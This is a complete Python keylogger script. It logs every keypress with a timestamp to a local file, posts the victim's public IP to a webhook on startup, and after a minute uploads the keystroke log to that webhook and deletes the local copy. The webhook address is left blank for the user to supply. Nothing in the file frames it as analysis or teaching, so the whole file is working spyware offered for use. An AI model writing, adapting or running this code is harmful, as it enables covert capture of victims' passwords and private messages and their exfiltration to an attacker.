import keyboard
import datetime
import requests
import threading
import time
import os


webhook_url = '' # your webhook url

ip = requests.get('https://api.ipify.org').text

requests.post(webhook_url, json={"content": f"Client connected: {ip}"})

def on_key(event):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key = event.name
    with open("keypresses.txt", "a") as file:
        file.write(f"{timestamp} - Key {key} was pressed.\n")


def upload_to_webhook():
    time.sleep(60)
    requests.post(webhook_url, files={"file": open('keypresses.txt', "rb")})
    os.remove("keypresses.txt")


while True:
    threading.Thread(target=upload_to_webhook).start()
    keyboard.on_press(on_key)
    keyboard.wait()
